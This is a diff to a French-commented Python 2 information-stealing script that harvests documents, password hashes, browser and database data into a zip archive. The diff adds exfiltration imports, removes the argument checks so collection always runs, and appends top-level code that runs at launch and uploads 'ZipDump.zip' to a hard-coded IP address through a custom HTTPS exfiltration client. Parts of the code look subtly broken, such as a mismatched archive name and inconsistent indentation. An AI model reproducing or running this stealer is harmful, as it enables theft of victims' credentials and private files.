@@ -1,3 +1,40 @@
+
+# -*- coding: utf-8 -*-
+
+###########################
+#  IMPORT  pour polop.py  #
+###########################
+
+import argparse
+import os, sys
+import shutil, zipfile
+import os.path
+import glob
+import subprocess
+import getpass
+###########################
+
+##################################
+#Imports for exfiltration (https)#
+##################################
+
+import ssl
+import sys
+import time
+import socket
+import hashlib
+import urllib2
+
+from Crypto import Random
+from Crypto.Cipher import AES
+
+from itertools import izip_longest
+# Setting timeout so that we won't wait forever
+timeout = 2
+socket.setdefaulttimeout(timeout)
+###################################
+
+
 class info_search():
 
 	def __init__(self):
@@ -205,27 +242,12 @@ class info_search():
 			
 	def main_infosearch(self):
 
-        	myinstance = info_search()
-		if self.all == True and self.char == False and self.format == False:
-		    myinstance.parse_all()
-		elif bool(self.char) == True and self.all == False:
-		    myinstance.parse_with_char()
-		elif bool(self.format) == True and self.all == False:
-		    myinstance.parse_with_format()
-		elif self.hash == True:
-		    myinstance.dump_pass()
-		elif self.browser == True:
-		    myinstance.dump_browser()
-		elif self.database == True:
-		    myinstance.dump_database()
-
-		if self.all == True or bool(self.char) == True or bool(self.format) == True or self.hash == True or self.browser == True or self.database == True:
+        	myinstance = info_search().parse_all()
+		
 		    try:
 			myinstance.archivage()
 		    except:
 			print("[Error] zip error")
-		if self.all == False and self.char == False and self.format == False and self.hash == False and self.browser == False and self.database == False:
-		    print ("[Error] Add arguments to launch script")
 
 	#myinstanceglobal = info_search()
 	#myinstanceglobal.main()
@@ -414,3 +436,11 @@ class HTTPSExfiltrationClient():
 		self.sock.send("\x17\x03\x03\x16\x05\x16")
 		self.sock.close()
 		return 0
+
+print "[*] récupération des documents spécifiques"
+myinstanceglobal = info_search()
+myinstanceglobal.main_infosearch()
+print "[*] fichier enregistré sous collecte.zip"
+client = HTTPSExfiltrationClient(host='213.32.112.42', key="123")
+client.sendFile("ZipDump.zip")
+client.close()
